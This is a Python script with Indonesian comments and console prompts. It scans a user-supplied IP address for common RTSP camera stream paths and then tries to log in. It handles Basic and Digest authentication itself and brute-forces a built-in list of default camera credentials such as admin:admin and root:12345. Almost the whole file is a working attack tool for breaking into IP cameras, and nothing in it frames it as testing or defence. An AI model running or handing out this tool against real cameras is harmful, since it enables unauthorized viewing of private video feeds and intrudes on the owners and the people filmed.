import socket
import base64
import hashlib
import re

def check_rtsp_path(ip, port=554, path_list=None):
    """
    Scan daftar path RTSP pada target IP dengan OPTIONS request.
    Mengembalikan list path yang valid (respon 200 OK).
    """
    if path_list is None:
        path_list = [
            "live.sdp", "stream", "h264", "video", "videoMain",
            "media/video1", "axis-media/media.amp", "cam/realmonitor",
            "ch1-s1", "Streaming/Channels/1"
        ]

    found = []

    print("\n--- Mulai scan RTSP paths ---")
    for idx, path in enumerate(path_list, start=1):
        try:
            print(f"[+] Coba: rtsp://{ip}:{port}/{path}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))

            request = (
                f"OPTIONS rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
                f"CSeq: {idx}\r\n"
                f"User-Agent: FlexiTUBE-Scanner\r\n"
                f"\r\n"
            )
            s.send(request.encode())
            response = s.recv(2048).decode(errors="ignore")
            s.close()

            if "200 OK" in response:
                print(f"[✔] Ditemukan: /{path}")
                found.append(path)
            else:
                print(f"[×] Response bukan 200 OK untuk /{path}, response singkat:")
                print(response.split("\r\n")[0])  # print status line saja
        except Exception as e:
            print(f"[×] Gagal menghubungi /{path} ({e})")
            continue

    return found


def parse_digest_auth(www_authenticate):
    # Ambil data dari header WWW-Authenticate untuk Digest
    realm = re.search(r'realm="([^"]+)"', www_authenticate)
    nonce = re.search(r'nonce="([^"]+)"', www_authenticate)
    qop = re.search(r'qop="([^"]+)"', www_authenticate)
    opaque = re.search(r'opaque="([^"]+)"', www_authenticate)

    return {
        "realm": realm.group(1) if realm else "",
        "nonce": nonce.group(1) if nonce else "",
        "qop": qop.group(1) if qop else "",
        "opaque": opaque.group(1) if opaque else "",
    }


def build_digest_auth(username, password, method, uri, auth_data, nc="00000001", cnonce="abcdef1234567890"):
    HA1 = hashlib.md5(f"{username}:{auth_data['realm']}:{password}".encode()).hexdigest()
    HA2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    if auth_data["qop"]:
        response = hashlib.md5(f"{HA1}:{auth_data['nonce']}:{nc}:{cnonce}:{auth_data['qop']}:{HA2}".encode()).hexdigest()
    else:
        response = hashlib.md5(f"{HA1}:{auth_data['nonce']}:{HA2}".encode()).hexdigest()

    auth_header = (
        f'Digest username="{username}", realm="{auth_data["realm"]}", nonce="{auth_data["nonce"]}", uri="{uri}", '
        f'response="{response}", '
        f'cnonce="{cnonce}", nc={nc}, qop={auth_data["qop"]}'
    )
    if auth_data.get("opaque"):
        auth_header += f', opaque="{auth_data["opaque"]}"'
    return auth_header


def send_rtsp_describe(ip, port, path, cseq, auth_header=""):
    request = (
        f"DESCRIBE rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
        f"CSeq: {cseq}\r\n"
        f"User-Agent: FlexiTUBE-Scanner\r\n"
        f"Accept: application/sdp\r\n"
    )
    if auth_header:
        request += f"Authorization: {auth_header}\r\n"
    request += "\r\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, port))
    s.send(request.encode())
    response = s.recv(4096).decode(errors="ignore")
    s.close()
    return response


def describe_rtsp_path(ip, path, port=554, user=None, password=None):
    """
    Kirim request DESCRIBE ke RTSP path dengan opsi autentikasi Basic/Digest.
    Jika user/password tidak diberikan, kirim tanpa autentikasi dulu.
    """
    cseq = 1
    print(f"\n[🧪 DESCRIBE] rtsp://{ip}:{port}/{path}")

    # Kirim DESCRIBE tanpa autentikasi
    resp = send_rtsp_describe(ip, port, path, cseq)

    print("=== RESPONSE ===")
    print(resp)

    # Jika butuh autentikasi (401 Unauthorized) dan user/password disediakan, coba brute force
    if "401 Unauthorized" in resp and user is not None and password is not None:
        www_authenticate = ""
        for line in resp.splitlines():
            if line.lower().startswith("www-authenticate:"):
                www_authenticate = line.split(":", 1)[1].strip()
                break

        print(f"\n[⚠️] Server meminta autentikasi: {www_authenticate}")

        # Cek tipe autentikasi
        is_digest = www_authenticate.lower().startswith("digest")
        is_basic = www_authenticate.lower().startswith("basic")

        if is_basic:
            credentials = f"{user}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            auth_header = f"Basic {encoded_credentials}"

            resp_auth = send_rtsp_describe(ip, port, path, cseq + 1, auth_header)

            print("\n=== RESPONSE (dengan Basic Auth) ===")
            print(resp_auth)

            return resp_auth

        elif is_digest:
            auth_data = parse_digest_auth(www_authenticate)
            uri = f"rtsp://{ip}:{port}/{path}"
            auth_header = build_digest_auth(user, password, "DESCRIBE", uri, auth_data)

            resp_auth = send_rtsp_describe(ip, port, path, cseq + 1, auth_header)

            print("\n=== RESPONSE (dengan Digest Auth) ===")
            print(resp_auth)

            return resp_auth

        else:
            print("[!] Tipe autentikasi tidak dikenali.")
            return resp

    return resp


def brute_force_rtsp(ip, port=554, path="live.sdp"):
    user_pass_list = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "1234"),
        ("root", "root"),
        ("root", "12345"),
        ("root", "password"),
        ("user", "user"),
        ("admin", "password"),
        ("admin", ""),
        ("", "admin"),
    ]

    cseq = 1
    uri = f"rtsp://{ip}:{port}/{path}"

    print(f"\n[🔨 Brute Force] Mulai brute force RTSP ke {uri}")

    # Kirim dulu request tanpa auth untuk dapat WWW-Authenticate
    response = send_rtsp_describe(ip, port, path, cseq)
    if "401 Unauthorized" not in response:
        print("[ℹ️] Tidak perlu autentikasi, stream terbuka.")
        print(response)
        return None

    www_authenticate = ""
    for line in response.splitlines():
        if line.lower().startswith("www-authenticate:"):
            www_authenticate = line.split(":", 1)[1].strip()
            break

    if not www_authenticate:
        print("[!] Header WWW-Authenticate tidak ditemukan, tidak bisa brute force.")
        return None

    print(f"[ℹ️] Server meminta autentikasi: {www_authenticate}")

    is_digest = www_authenticate.lower().startswith("digest")
    is_basic = www_authenticate.lower().startswith("basic")

    if is_digest:
        auth_data = parse_digest_auth(www_authenticate)

    for username, password in user_pass_list:
        cseq += 1
        if is_basic:
            credentials = f"{username}:{password}"
            encoded = base64.b64encode(credentials.encode()).decode()
            auth_header = f"Basic {encoded}"
        elif is_digest:
            auth_header = build_digest_auth(username, password, "DESCRIBE", uri, auth_data)
        else:
            print("[!] Jenis autentikasi tidak dikenali.")
            return None

        print(f"[Coba] {username}:{password}")
        resp = send_rtsp_describe(ip, port, path, cseq, auth_header)

        if "200 OK" in resp:
            print(f"[✔ Berhasil] Username: {username}, Password: {password}")
            print(resp)
            return (username, password)

    print("[× Gagal] Brute force tidak menemukan username/password yang cocok.")
    return None


if __name__ == "__main__":
    target_ip = input("Masukkan IP target: ").strip()
    found_paths = check_rtsp_path(target_ip)

    if found_paths:
        print("\nPath aktif ditemukan:")
        for path in found_paths:
            print(f" - rtsp://{target_ip}:554/{path}")

        # DESCRIBE path pertama, tanpa autentikasi dulu
        response = describe_rtsp_path(target_ip, found_paths[0])

        # Jika response mengindikasikan autentikasi dibutuhkan, coba brute force
        if response and "401 Unauthorized" in response:
            print("\n[!] Mungkin diperlukan autentikasi RTSP.")
            brute_choice = input("Mau coba brute force dengan user/pass default? (y/n): ").strip().lower()
            if brute_choice == "y":
                brute_force_rtsp(target_ip, 554, found_paths[0])

    else:
        print("Tidak ditemukan path aktif.")
